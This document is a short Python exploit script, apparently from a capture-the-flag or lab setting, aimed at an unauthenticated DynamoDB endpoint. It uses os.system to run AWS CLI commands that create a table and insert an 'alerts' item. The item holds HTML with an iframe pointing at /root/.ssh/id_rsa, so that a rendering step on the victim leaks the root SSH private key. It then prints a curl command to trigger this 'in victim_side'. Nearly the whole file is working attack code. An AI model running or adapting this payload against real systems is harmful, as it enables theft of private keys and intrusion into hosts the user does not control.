import os
import re
import sys

banner = """
   _  __    __  __            _                
  /_\/ / /\ \ \/ _\_ __  _ __(_)_   _____ _ __ 
 //_\\ \/  \/ /\ \| '_ \| '__| \ \ / / _ \ '__|
/  _  \  /\  / _\ \ |_) | |  | |\ V /  __/ |   
\_/ \_/\/  \/  \__/ .__/|_|  |_| \_/ \___|_|   
                  |_|
                                              """

usage = f"{sys.argv[0]} <Table_name> <Target_URL>"


if len(sys.argv) < 3:
    print(usage)
    sys.exit()

table_name = sys.argv[1]
target_url = sys.argv[2]

print(banner)

payload = f"aws dynamodb create-table \
    --table-name {table_name} \
    --attribute-definitions \
        AttributeName=title,AttributeType=S \
        AttributeName=data,AttributeType=S \
    --key-schema \
        AttributeName=title,KeyType=HASH \
        AttributeName=data,KeyType=RANGE \
--provisioned-throughput \
        ReadCapacityUnits=10,WriteCapacityUnits=5 --endpoint-url {target_url}"

payload2 = """aws dynamodb put-item \
    --table-name alerts \
    --item '{
        "title": {"S": "Kaboom!!!!"},
        "data": {"S": "<html><head></head><body><iframe src='/root/.ssh/id_rsa'></iframe></body></html>"}
      }' \
    --return-consumed-capacity TOTAL --endpoint-url """+target_url



os.system(payload)
os.system(payload2)


curl_cmd = """curl --data "action=get_"""+f"""{table_name}" <url>:<port>/ """

print(f"[+]Execute below command in victim_side!!!!!")
print("+"+f"-"*len(curl_cmd)+"+")
print(f"|{curl_cmd}|")
print("+"+"-"*len(curl_cmd)+"+")
